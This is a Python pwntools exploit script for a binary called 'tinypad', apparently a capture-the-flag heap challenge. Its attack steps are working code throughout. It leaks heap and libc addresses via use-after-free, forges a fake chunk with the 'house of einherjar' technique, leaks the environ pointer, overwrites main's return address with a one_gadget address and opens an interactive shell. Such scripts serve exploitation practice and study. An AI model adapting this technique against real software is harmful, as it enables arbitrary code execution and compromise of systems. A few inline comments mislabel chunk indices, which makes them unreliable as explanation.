from pwn import *
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
if args['DEBUG']:
    context.log_level = 'debug'
tinypad = ELF("./tinypad")
if args['REMOTE']:
    p = remote('127.0.0.1', 7777)
    libc = ELF('./libc.so.6')
else:
    p = process("./tinypad")
    libc = ELF('./libc.so.6')
    main_arena_offset = 0x3c4b20
log.info('PID: ' + str(proc.pidof(p)[0]))


def add(size, content):
    p.recvuntil('(CMD)>>> ')
    p.sendline('a')
    p.recvuntil('(SIZE)>>> ')
    p.sendline(str(size))
    p.recvuntil('(CONTENT)>>> ')
    p.sendline(content)


def edit(idx, content):
    p.recvuntil('(CMD)>>> ')
    p.sendline('e')
    p.recvuntil('(INDEX)>>> ')
    p.sendline(str(idx))
    p.recvuntil('(CONTENT)>>> ')
    p.sendline(content)
    p.recvuntil('Is it OK?\n')
    p.sendline('Y')


def delete(idx):
    p.recvuntil('(CMD)>>> ')
    p.sendline('d')
    p.recvuntil('(INDEX)>>> ')
    p.sendline(str(idx))


def run():
    p.recvuntil(
        '  ============================================================================\n\n'
    )
    # 1. leak heap base
    add(0x70, 'a' * 8)  # idx 0
    add(0x70, 'b' * 8)  # idx 1
    add(0x100, 'c' * 8)  # idx 2

    delete(2)  # delete idx 1
    delete(1)  # delete idx 0, idx 0 point to idx 1
    p.recvuntil(' # CONTENT: ')
    data = p.recvuntil('\n', drop=True)  # get pointer point to idx1
    heap_base = u64(data.ljust(8, '\x00')) - 0x80
    log.success('get heap base: ' + hex(heap_base))

    # 2. leak libc base
    # this will trigger malloc_consolidate
    # first idx0 will go to unsorted bin
    # second idx1 will merge with idx0(unlink), and point to idx0
    # third idx1 will merge into top chunk
    # but cause unlink feture, the idx0's fd and bk won't change
    # so idx0 will leak the unsorted bin addr
    delete(3)
    p.recvuntil(' # CONTENT: ')
    data = p.recvuntil('\n', drop=True)
    unsorted_offset_arena = 8 + 10 * 8
    main_arena = u64(data.ljust(8, '\x00')) - unsorted_offset_arena
    libc_base = main_arena - main_arena_offset
    log.success('main arena addr: ' + hex(main_arena))
    log.success('libc base addr: ' + hex(libc_base))

    # 3. house of einherjar
    add(0x18, 'a' * 0x18)  # idx 0
    # we would like trigger house of einherjar at idx 1
    add(0x100, 'b' * 0xf8 + '\x11')  # idx 1
    add(0x100, 'c' * 0xf8)  # idx 2
    add(0x100, 'd' * 0xf8)  #idx 3

    # create a fake chunk in tinypad's 0x100 buffer, offset 0x20
    tinypad_addr = 0x602040
    fakechunk_addr = tinypad_addr + 0x20
    fakechunk_size = 0x101
    fakechunk = p64(0) + p64(fakechunk_size) + p64(fakechunk_addr) + p64(
        fakechunk_addr)
    edit(3, 'd' * 0x20 + fakechunk)

    # overwrite idx 1's prev_size and
    # set minaddr of size to '\x00'
    # idx 0's chunk size is 0x20
    diff = heap_base + 0x20 - fakechunk_addr
    log.info('diff between idx1 and fakechunk: ' + hex(diff))
    # '\0' padding caused by strcpy
    diff_strip = p64(diff).strip('\0')
    number_of_zeros = len(p64(diff)) - len(diff_strip)
    for i in range(number_of_zeros + 1):
        data = diff_strip.rjust(0x18 - i, 'f')
        edit(1, data)
    delete(2)
    p.recvuntil('\nDeleted.')

    # fix the fake chunk size, fd and bk
    # fd and bk must be unsorted bin
    edit(4, 'd' * 0x20 + p64(0) + p64(0x101) + p64(main_arena + 88) +
         p64(main_arena + 88))

    # 3. overwrite malloc_hook with one_gadget

    one_gadget_addr = libc_base + 0x45216
    environ_pointer = libc_base + libc.symbols['__environ']
    log.info('one gadget addr: ' + hex(one_gadget_addr))
    log.info('environ pointer addr: ' + hex(environ_pointer))
    #fake_malloc_chunk = main_arena - 60 + 9
    # set memo[0].size = 'a'*8,
    # set memo[0].content point to environ to leak environ addr
    fake_pad = 'f' * (0x100 - 0x20 - 0x10) + 'a' * 8 + p64(
        environ_pointer) + 'a' * 8 + p64(0x602148)
    # get a fake chunk
    add(0x100 - 8, fake_pad)  # idx 2
    #gdb.attach(p)

    # get environ addr
    p.recvuntil(' # CONTENT: ')
    environ_addr = p.recvuntil('\n', drop=True).ljust(8, '\x00')
    environ_addr = u64(environ_addr)
    main_ret_addr = environ_addr - 30 * 8

    # set memo[0].content point to main_ret_addr
    edit(2, p64(main_ret_addr))
    # overwrite main_ret_addr with one_gadget addr
    edit(1, p64(one_gadget_addr))
    p.interactive()


if __name__ == "__main__":
    run()
